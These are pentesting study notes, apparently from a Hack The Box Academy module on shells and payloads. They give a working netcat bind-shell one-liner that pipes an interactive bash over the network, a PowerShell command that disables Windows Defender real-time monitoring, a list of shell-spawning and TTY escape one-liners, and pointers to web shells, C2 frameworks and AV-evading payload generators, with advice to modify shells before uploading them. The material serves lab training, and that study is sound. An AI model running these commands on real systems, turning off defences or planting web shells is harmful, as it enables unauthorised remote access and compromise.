##### **Bind Shells**
![](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

Orbixio@htb[/htb]$ nc -nv 10.10.14.2 7777
```
#### **Reverse Shells**
![](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

```powershell
# Disable AV
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

For generating shells you can go to [RevShells](https://www.revshells.com/).

#### **Payload Generation Tools**

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |
##### **Interactive TTY**
```shell-session
python3 -c 'import pty; pty.spawn("/bin/sh")' 

/bin/sh -i

perl -e 'exec "/bin/sh";'

ruby -e 'exec "/bin/sh"'

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell

```

#### **Web Shells**

The Laudanum files can be found in the `/usr/share/laudanum` directory.
The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more.

**Modify before uploading**
![](https://academy.hackthebox.com/storage/modules/115/modify-shell.png)

Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang).
The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.

**Modify the Shell for Use**
![image](https://academy.hackthebox.com/storage/modules/115/antak-changes.png)

Php Shell: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
